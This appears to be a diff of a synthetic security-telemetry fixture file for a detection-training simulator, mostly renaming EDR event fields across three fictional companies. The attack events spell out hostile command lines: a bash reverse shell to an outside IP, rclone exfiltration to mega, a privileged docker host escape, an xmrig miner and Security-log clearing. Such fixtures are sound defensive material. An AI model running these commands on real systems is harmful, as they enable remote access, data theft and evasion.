@@ -61,7 +61,7 @@ const ROCKETSTACK_EVENTS: TelemetryEvent[] = [
     src_ip: "172.16.10.7",
     description: "t.levy ran an npm build task (node process) on LAP-007",
     process: { name: "node", pid: 2341, parent_name: "launchd", parent_pid: 1, user: "t.levy", cmdline: "node /usr/local/lib/node_modules/npm/bin/npm-cli.js run build" },
-    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.Confidence": "high", "crowdstrike.TechniqueId": "none", "action_result": "allowed", "file.signed": "true" }
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "action_result": "allowed", "process.code_signature.exists": true, "process.code_signature.trusted": true }
   },
   {
     id: "rs_cs_002", ts: "2026-05-10T08:20:00.000Z",
@@ -199,7 +199,7 @@ const ROCKETSTACK_EVENTS: TelemetryEvent[] = [
     src_ip: "172.16.10.50",
     description: "osqueryd started on SRV-PROD-001 (fleet monitoring)",
     process: { name: "osqueryd", pid: 3300, parent_name: "launchd", parent_pid: 1, user: "root", cmdline: "/usr/local/bin/osqueryd --flagfile=/etc/osquery/osquery.flags" },
-    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.Confidence": "high", "action_result": "allowed" }
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "action_result": "allowed" }
   },
   {
     id: "rs_cs_006", ts: "2026-05-10T11:15:00.000Z",
@@ -208,7 +208,7 @@ const ROCKETSTACK_EVENTS: TelemetryEvent[] = [
     src_ip: "172.16.10.7",
     description: "t.levy ran a migration script on LAP-007",
     process: { name: "python3", pid: 4450, parent_name: "Terminal", parent_pid: 4200, user: "t.levy", cmdline: "python3 scripts/migrate_prod_data.py --env prod --dry-run" },
-    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.Confidence": "medium", "action_result": "allowed" }
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "action_result": "allowed" }
   },
   {
     id: "rs_cs_007", ts: "2026-05-10T12:50:00.000Z",
@@ -300,7 +300,7 @@ const ROCKETSTACK_EVENTS: TelemetryEvent[] = [
     fp_explanation: "Engineer ran a Python security script with unusual subprocess args to simulate API load. The command pattern (subprocess with shell=True and os.system calls) matches attacker tooling heuristics, but the script is in the RocketStack internal GitHub repo and was peer-reviewed. No outbound network connections were made.",
     description: "t.levy ran python3 security-load-test.py on LAP-007",
     process: { name: "python3", pid: 5900, parent_name: "zsh", parent_pid: 5001, user: "t.levy", cmdline: "python3 security-load-test.py --target https://api.rocketstack.io --requests 500 --concurrency 20" },
-    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.Confidence": "medium", "action_result": "allowed" }
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "action_result": "allowed" }
   },
   {
     id: "rs_fp_002", ts: "2026-05-10T11:45:00.000Z",
@@ -511,8 +511,8 @@ const ROCKETSTACK_EVENTS: TelemetryEvent[] = [
     process: { name: "rclone", pid: 7821, parent_name: "bash", parent_pid: 7700,
                user: "t.chen", cmdline: "rclone copy /Users/t.chen/Downloads mega:backup --progress" },
     raw: {
-      "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.Confidence": "high",
-      "crowdstrike.TechniqueId": "T1567.002", "crowdstrike.Tactic": "Exfiltration",
+      "crowdstrike.event_simpleName": "ProcessRollup2",
+      "threat.technique.id": "T1567", "threat.technique.subtechnique.id": "T1567.002", "crowdstrike.Tactic": "Exfiltration",
       "process.command_line": "rclone copy /Users/t.chen/Downloads mega:backup --progress",
       "network.bytes_out": "6710886400", "destination.domain": "g.api.mega.co.nz",
       "action_result": "detect_only" }
@@ -866,7 +866,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     src_ip: "192.168.10.45",
     description: "n.smits launched Epiq.EMR.exe on WS-MED-045",
     process: { name: "Epiq.EMR.exe", pid: 3320, parent_name: "explorer.exe", parent_pid: 2100, user: "n.smits", integrity: "medium" },
-    raw: { "s1.eventType": "Process Creation", "file.signed": "true", "file.vendor": "Epiq Systems", "action_result": "allowed" }
+    raw: { "s1.eventType": "Process Creation", "process.code_signature.exists": true, "process.code_signature.trusted": true, "file.vendor": "Epiq Systems", "action_result": "allowed" }
   },
   {
     id: "mc_s1_002", ts: "2026-05-10T07:08:00.000Z",
@@ -875,7 +875,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     src_ip: "192.168.10.67",
     description: "PACS imaging viewer launched on WS-MED-067",
     process: { name: "SecuraPACS.exe", pid: 1820, parent_name: "explorer.exe", parent_pid: 1600, user: "p.hoekstra", integrity: "medium" },
-    raw: { "s1.eventType": "Process Creation", "file.signed": "true", "action_result": "allowed" }
+    raw: { "s1.eventType": "Process Creation", "process.code_signature.exists": true, "process.code_signature.trusted": true, "action_result": "allowed" }
   },
   {
     id: "mc_s1_003", ts: "2026-05-10T07:55:00.000Z",
@@ -883,7 +883,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     vendor: "SentinelOne", hostname: "SRV-MEDCORE-FILE01", src_ip: "192.168.10.210",
     description: "Veeam backup job started on SRV-MEDCORE-FILE01",
     process: { name: "veeam.backup.service.exe", pid: 6700, parent_name: "services.exe", parent_pid: 668, user: "SYSTEM" },
-    raw: { "s1.eventType": "Process Creation", "file.signed": "true", "action_result": "allowed" }
+    raw: { "s1.eventType": "Process Creation", "process.code_signature.exists": true, "process.code_signature.trusted": true, "action_result": "allowed" }
   },
   {
     // ⚠ ATTACK STEP 1 — Spear-phishing email opened, Word doc with macro
@@ -897,7 +897,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     mitre_technique: "T1566.001",
     process: { name: "cmd.exe", pid: 7741, parent_name: "WINWORD.EXE", parent_pid: 6610, user: "dr.vandijk", cmdline: "cmd.exe /c whoami /all > C:\\Users\\DOCVDIJK\\AppData\\Local\\Temp\\~tmp88A.txt", integrity: "high" },
     file: { path: "C:\\Users\\dr.vandijk\\AppData\\Local\\Temp\\MedConf2026_Schedule.docm", sha256: "d3c6766e5479a506de5991edf1cc62d35f999dda86baa1b57f7c541e746990f3" },
-    raw: { "s1.eventType": "Indicators", "s1.indicator.name": "OFFICE_MACRO_CMD_SPAWN", "action_result": "allowed", "policy.name": "Clinical-Detect-Only", "file.signed": "false" }
+    raw: { "s1.eventType": "Indicators", "s1.indicator.name": "OFFICE_MACRO_CMD_SPAWN", "action_result": "allowed", "policy.name": "Clinical-Detect-Only", "process.code_signature.exists": false, "process.code_signature.trusted": false }
   },
   {
     // ⚠ ATTACK STEP 2 — PowerShell with encoded command (not blocked)
@@ -1048,7 +1048,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     vendor: "SentinelOne", hostname: "SRV-MEDCORE-DC01", src_ip: "192.168.10.1",
     description: "AD database integrity check (ntdsutil) on SRV-MEDCORE-DC01",
     process: { name: "ntdsutil.exe", pid: 5512, parent_name: "svchost.exe", parent_pid: 1024, user: "SYSTEM", cmdline: "ntdsutil.exe \"activate instance ntds\" \"files\" \"integrity\" quit quit" },
-    raw: { "s1.eventType": "Process Creation", "file.signed": "true", "action_result": "allowed" }
+    raw: { "s1.eventType": "Process Creation", "process.code_signature.exists": true, "process.code_signature.trusted": true, "action_result": "allowed" }
   },
   {
     id: "mc_s1_010", ts: "2026-05-10T12:30:00.000Z",
@@ -1347,7 +1347,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     fp_explanation: "IT admin ran a PowerShell script to bulk-reset passwords for 30 nurse accounts ahead of a compliance audit. The script uses Set-ADAccountPassword in a loop — this matches 'password brute-force preparation' heuristics but is fully authorised (change CHG-MC-441). The admin account is a Tier-1 admin with MFA, running from the IT jump server.",
     description: "admin.vandenberg bulk AD password reset (compliance audit prep)",
     process: { name: "powershell.exe", pid: 6700, parent_name: "explorer.exe", parent_pid: 5900, user: "admin.vandenberg", cmdline: "powershell.exe -File C:\\IT\\scripts\\Reset-NursePasswords.ps1 -OU 'OU=Nurses,DC=medcore,DC=nl'" },
-    raw: { "s1.eventType": "Process Creation", "s1.detection.classification_source": "Engine", "file.signed": "true", "action_result": "allowed" }
+    raw: { "s1.eventType": "Process Creation", "s1.detection.classification_source": "Engine", "process.code_signature.exists": true, "process.code_signature.trusted": true, "action_result": "allowed" }
   },
 
   // ── IT Verify events — MedCore ───────────────────────────────────────────────
@@ -1738,7 +1738,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
                user: "SYSTEM", cmdline: "wuauclt.exe /updatenow" },
     raw: {
       "s1.eventType": "Process Creation",
-      "file.signed": "true", "windows.update.kb_ids": "KB5034441,KB5034122,KB5035942",
+      "process.code_signature.exists": true, "process.code_signature.trusted": true, "windows.update.kb_ids": "KB5034441,KB5034122,KB5035942",
       "windows.update.reboot_required": "false", "action_result": "allowed" }
   },
   {
@@ -1752,7 +1752,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
                cmdline: "SentinelCtl.exe update -from 24.1.2.198 -to 24.1.3.277" },
     raw: {
       "s1.eventType": "Process Creation",
-      "file.signed": "true",
+      "process.code_signature.exists": true, "process.code_signature.trusted": true,
       "s1.agent.version_from": "24.1.2.198", "s1.agent.version_to": "24.1.3.277",
       "s1.agent.update_type": "agent-package", "action_result": "allowed" }
   },
@@ -2389,7 +2389,7 @@ const QUANTUMBANK_EVENTS: TelemetryEvent[] = [
     src_ip: "10.100.1.55",
     description: "explorer.exe launched BLOOMBERG.exe on WKS-QB-055 — user opened Bloomberg terminal",
     process: { name: "BLOOMBERG.exe", pid: 4400, parent_name: "explorer.exe", parent_pid: 3100, user: "f.zimmermann", integrity: "medium" },
-    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.Confidence": "high", "file.signed": "true", "action_result": "allowed" }
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "process.code_signature.exists": true, "process.code_signature.trusted": true, "action_result": "allowed" }
   },
   {
     id: "qb_cs_002", ts: "2026-05-10T09:00:00.000Z",
@@ -2399,7 +2399,7 @@ const QUANTUMBANK_EVENTS: TelemetryEvent[] = [
     src_ip: "10.100.1.33",
     description: "PDF attachment opened in Acrobat Reader on WKS-QB-033",
     process: { name: "AcroRd32.exe", pid: 3800, parent_name: "OUTLOOK.EXE", parent_pid: 2900, user: "e.steiner", integrity: "low" },
-    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.SandboxVerdict": "clean", "file.signed": "true", "action_result": "allowed" }
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2",  "process.code_signature.exists": true, "process.code_signature.trusted": true, "action_result": "allowed" }
   },
   {
     id: "qb_cs_003", ts: "2026-05-10T10:45:00.000Z",
@@ -2473,7 +2473,7 @@ const QUANTUMBANK_EVENTS: TelemetryEvent[] = [
     fp_explanation: "The QuantumBank Automated Testing team runs daily smoke tests against the core banking sandbox using a test script that calls net.exe commands to verify connectivity. net.exe from a user session looks like lateral movement recon, but this is a scheduled test job running under the test-runner service account. CHG-QB-218 covers this activity.",
     description: "The automated test-runner account queried shared resources on SRV-QB-CORE01 from WKS-QB-033",
     process: { name: "net.exe", pid: 7700, parent_name: "python.exe", parent_pid: 7600, user: "svc-test-runner", cmdline: "net view \\\\SRV-QB-CORE01 /all" },
-    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.TechniqueId": "T1016", "crowdstrike.Confidence": "medium", "action_result": "allowed" }
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "threat.technique.id": "T1016", "action_result": "allowed" }
   },
   {
     id: "qb_fp_002", ts: "2026-05-10T11:30:00.000Z",
@@ -2675,10 +2675,10 @@ const QUANTUMBANK_EVENTS: TelemetryEvent[] = [
     description: "Falcon Device Control policy 'PCI-USB-Block' blocked an unmanaged USB mass-storage device h.weber connected to WKS-QB-033 at 19:22 — the drive was denied all access before any file could be written. WKS-QB-033 is a workstation that handles SWIFT financial data.",
     raw: {
       "crowdstrike.event_simpleName": "DcUsbDeviceConnected", "crowdstrike.PatternDispositionDescription": "blocked",
-      "crowdstrike.PolicyName": "PCI-USB-Block", "crowdstrike.DevicePolicyEnforcement": "BLOCK_ALL",
+      "crowdstrike.PolicyName": "PCI-USB-Block", 
       "crowdstrike.DeviceManufacturer": "Verbatim", "crowdstrike.DeviceProduct": "STORE N GO",
-      "crowdstrike.DeviceSerialNumber": "9F2C1A44E8B70021", "crowdstrike.DeviceClass": "USB Mass Storage",
-      "crowdstrike.TechniqueId": "T1052.001", "crowdstrike.SeverityName": "High",
+      "crowdstrike.DeviceInstanceId": "USBSTOR\\Disk&Ven_Verbatim&Prod_STORE_N_GO&Rev_1.00\\9F2C1A44E8B70021&0", "crowdstrike.DeviceUsbClass": "8",
+      "threat.technique.id": "T1052", "threat.technique.subtechnique.id": "T1052.001", "crowdstrike.SeverityName": "High",
       "action_result": "blocked" }
   },
   {
@@ -3368,7 +3368,7 @@ const ROCKETSTACK_ATTACKS: TelemetryEvent[] = [
     description: "Installing the npm package rocketstack-utils 3.2.1 ran an automatic post-install script on LAP-003",
     mitre_technique: "T1195.001",
     process: { name: "node", pid: 9310, parent_name: "npm", parent_pid: 9300, user: "s.amir", cmdline: "node /tmp/.npm-install/postinstall.js", hash: { sha256: "85427add0401af37258ec324e4fbb48b13042888b2f3d9cbd0f6ce63e85fac2c" } },
-    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.Confidence": "low", "crowdstrike.CommandLine": "node /tmp/.npm-install/postinstall.js", "crowdstrike.FileName": "node", "crowdstrike.FilePath": "/usr/local/bin/", "crowdstrike.ParentProcessName": "npm", "crowdstrike.UserName": "s.amir", "crowdstrike.SHA256HashData": "85427add0401af37258ec324e4fbb48b13042888b2f3d9cbd0f6ce63e85fac2c", "npm.package": "rocketstack-utils@3.2.1", "action_result": "allowed" }
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.CommandLine": "node /tmp/.npm-install/postinstall.js", "crowdstrike.FileName": "node", "crowdstrike.FilePath": "/usr/local/bin/", "crowdstrike.ParentBaseFileName": "npm", "crowdstrike.UserName": "s.amir", "crowdstrike.SHA256HashData": "85427add0401af37258ec324e4fbb48b13042888b2f3d9cbd0f6ce63e85fac2c", "npm.package": "rocketstack-utils@3.2.1", "action_result": "allowed" }
   },
   {
     // DNS is SIEM-normalized (ECS dns.* schema), attributed to the DNS feed rather than
@@ -3386,7 +3386,7 @@ const ROCKETSTACK_ATTACKS: TelemetryEvent[] = [
     description: "A node process on LAP-003 launched bash with a /dev/tcp redirect and connected out to 104.248.93.41:4444",
     mitre_technique: "T1059.004",
     process: { name: "bash", pid: 9420, parent_name: "node", parent_pid: 9310, user: "s.amir", cmdline: "bash -i >& /dev/tcp/104.248.93.41/4444 0>&1", hash: { sha256: "c4069c3b87b3698f3ae18f4602f869a7ddd7bf955c21aeebcf48f2b5b2dc7584" } },
-    raw: { "crowdstrike.event_simpleName": "NetworkConnectIP4", "crowdstrike.Confidence": "high", "crowdstrike.CommandLine": "bash -i >& /dev/tcp/104.248.93.41/4444 0>&1", "crowdstrike.FileName": "bash", "crowdstrike.FilePath": "/bin/", "crowdstrike.ParentProcessName": "node", "crowdstrike.UserName": "s.amir", "crowdstrike.SHA256HashData": "c4069c3b87b3698f3ae18f4602f869a7ddd7bf955c21aeebcf48f2b5b2dc7584", "action_result": "allowed" }
+    raw: { "crowdstrike.event_simpleName": "NetworkConnectIP4", "crowdstrike.CommandLine": "bash -i >& /dev/tcp/104.248.93.41/4444 0>&1", "crowdstrike.FileName": "bash", "crowdstrike.FilePath": "/bin/", "crowdstrike.ParentBaseFileName": "node", "crowdstrike.UserName": "s.amir", "crowdstrike.SHA256HashData": "c4069c3b87b3698f3ae18f4602f869a7ddd7bf955c21aeebcf48f2b5b2dc7584", "action_result": "allowed" }
   },
   chainAlert({ id: "rs_b3b", ts: "2026-05-10T08:52:20.000Z", name: "Reverse Shell", product: "CrowdStrike Falcon", severity: "High", mitre: "T1059.004", host: "LAP-003", props: {"Process": "bash", "Parent Process": "node", "Remote Address": "104.248.93.41:4444"}, description: "Sentinel received the CrowdStrike Falcon detection \"Reverse Shell\" (High) on LAP-003: bash under node, remote address 104.248.93.41:4444." }),
   {
@@ -3407,7 +3407,7 @@ const ROCKETSTACK_ATTACKS: TelemetryEvent[] = [
     description: "t.levy ran a Docker container on LAP-007 with --privileged, host PID/network namespaces and / mounted at /host",
     mitre_technique: "T1611",
     process: { name: "docker", pid: 12001, parent_name: "zsh", parent_pid: 11800, user: "t.levy", cmdline: "docker run --privileged --pid=host --net=host -v /:/host ubuntu nsenter -t 1 -m -u -i -n sh", hash: { sha256: "32bc2f4ca7cd25957d1bbf67a770f89fd7429fa3dd95dc8a6bdbf631dd392fee" } },
-    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.Confidence": "low", "crowdstrike.CommandLine": "docker run --privileged --pid=host --net=host -v /:/host ubuntu nsenter -t 1 -m -u -i -n sh", "crowdstrike.FileName": "docker", "crowdstrike.FilePath": "/usr/bin/", "crowdstrike.ParentProcessName": "zsh", "crowdstrike.UserName": "t.levy", "crowdstrike.SHA256HashData": "32bc2f4ca7cd25957d1bbf67a770f89fd7429fa3dd95dc8a6bdbf631dd392fee", "action_result": "allowed" }
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.CommandLine": "docker run --privileged --pid=host --net=host -v /:/host ubuntu nsenter -t 1 -m -u -i -n sh", "crowdstrike.FileName": "docker", "crowdstrike.FilePath": "/usr/bin/", "crowdstrike.ParentBaseFileName": "zsh", "crowdstrike.UserName": "t.levy", "crowdstrike.SHA256HashData": "32bc2f4ca7cd25957d1bbf67a770f89fd7429fa3dd95dc8a6bdbf631dd392fee", "action_result": "allowed" }
   },
   {
     id: "rs_c2", ts: "2026-05-10T15:09:00.000Z", source: "edr", event_type: "process_create",
@@ -3415,7 +3415,7 @@ const ROCKETSTACK_ATTACKS: TelemetryEvent[] = [
     description: "xmrig started as root on LAP-007 from a shell, connecting to supportxmr.com:5555",
     mitre_technique: "T1496",
     process: { name: "xmrig", path: "/tmp/.cache/xmrig", pid: 12050, parent_name: "sh", parent_pid: 12010, user: "root", cmdline: "/tmp/.cache/xmrig --coin monero --url supportxmr.com:5555 --user 47abc...", hash: { sha256: "f1dd2a9fd0d3d74d8f83bcae85ec8e2b7c319dc330253ea3d437d1805e0ab2bf" } },
-    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.Confidence": "medium", "crowdstrike.CommandLine": "xmrig --coin monero --url supportxmr.com:5555 --user 47abc...", "crowdstrike.FileName": "xmrig", "crowdstrike.FilePath": "/tmp/.cache/", "crowdstrike.ParentProcessName": "sh", "crowdstrike.UserName": "root", "crowdstrike.SHA256HashData": "f1dd2a9fd0d3d74d8f83bcae85ec8e2b7c319dc330253ea3d437d1805e0ab2bf", "action_result": "allowed" }
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.CommandLine": "xmrig --coin monero --url supportxmr.com:5555 --user 47abc...", "crowdstrike.FileName": "xmrig", "crowdstrike.FilePath": "/tmp/.cache/", "crowdstrike.ParentBaseFileName": "sh", "crowdstrike.UserName": "root", "crowdstrike.SHA256HashData": "f1dd2a9fd0d3d74d8f83bcae85ec8e2b7c319dc330253ea3d437d1805e0ab2bf", "action_result": "allowed" }
   },
   {
     // LAP-007 is t.levy's laptop, not an EC2 instance — it has no instance-profile
@@ -3686,7 +3686,7 @@ const QUANTUMBANK_ATTACKS: TelemetryEvent[] = [
                path: "C:\\Users\\m.huber\\AppData\\Local\\Temp\\svchost.exe",
                cmdline: "C:\\Users\\m.huber\\AppData\\Local\\Temp\\svchost.exe -k netsvcs",
                hash: { sha256: "dfcfb9d9e92004fe8ed31789a3791a8f57ee892b55245360e00da328e1ccb0bd" } },
-    raw: { "crowdstrike.event_simpleName": "DetectionSummaryEvent", "threat.name": "CobaltStrike.beacon.v4", "crowdstrike.Confidence": "high", "crowdstrike.CommandLine": "C:\\Users\\m.huber\\AppData\\Local\\Temp\\svchost.exe -k netsvcs", "crowdstrike.FileName": "svchost.exe", "crowdstrike.FilePath": "C:\\Users\\m.huber\\AppData\\Local\\Temp\\", "crowdstrike.ParentProcessName": "OUTLOOK.EXE", "crowdstrike.UserName": "m.huber", "crowdstrike.SHA256HashData": "dfcfb9d9e92004fe8ed31789a3791a8f57ee892b55245360e00da328e1ccb0bd", "action_result": "allowed", "crowdstrike.SeverityName": "MEDIUM" }
+    raw: { "crowdstrike.event_simpleName": "DetectionSummaryEvent", "threat.name": "CobaltStrike.beacon.v4", "crowdstrike.CommandLine": "C:\\Users\\m.huber\\AppData\\Local\\Temp\\svchost.exe -k netsvcs", "crowdstrike.FileName": "svchost.exe", "crowdstrike.FilePath": "C:\\Users\\m.huber\\AppData\\Local\\Temp\\", "crowdstrike.ParentBaseFileName": "OUTLOOK.EXE", "crowdstrike.UserName": "m.huber", "crowdstrike.SHA256HashData": "dfcfb9d9e92004fe8ed31789a3791a8f57ee892b55245360e00da328e1ccb0bd", "action_result": "allowed", "crowdstrike.SeverityName": "MEDIUM" }
   },
   {
     id: "qb_a3", ts: "2026-05-10T09:05:00.000Z", source: "firewall", event_type: "net_connection",
@@ -3730,7 +3730,7 @@ const QUANTUMBANK_ATTACKS: TelemetryEvent[] = [
     description: "wevtutil.exe cl Security ran as l.brunner on SRV-QB-ADMIN01; CrowdStrike terminated the process",
     mitre_technique: "T1070.001",
     process: { name: "wevtutil.exe", pid: 6621, parent_name: "cmd.exe", parent_pid: 6620, user: "l.brunner", cmdline: "wevtutil.exe cl Security" },
-    raw: { "crowdstrike.event_simpleName": "DetectionSummaryEvent", "crowdstrike.Technique": "Clear Windows Event Logs", "crowdstrike.TechniqueId": "T1070.001", "crowdstrike.Tactic": "Defense Evasion", "crowdstrike.SeverityName": "Critical", "crowdstrike.PatternDispositionDescription": "Process Terminated", "action_result": "process_killed", "process.killed": "true" }
+    raw: { "crowdstrike.event_simpleName": "DetectionSummaryEvent", "crowdstrike.Technique": "Clear Windows Event Logs", "threat.technique.id": "T1070", "threat.technique.subtechnique.id": "T1070.001", "crowdstrike.Tactic": "Defense Evasion", "crowdstrike.SeverityName": "Critical", "crowdstrike.PatternDispositionDescription": "Process Terminated", "action_result": "process_killed", "process.killed": "true" }
   },
   // ── Chain C ──────────────────────────────────────────────────────────────
   {
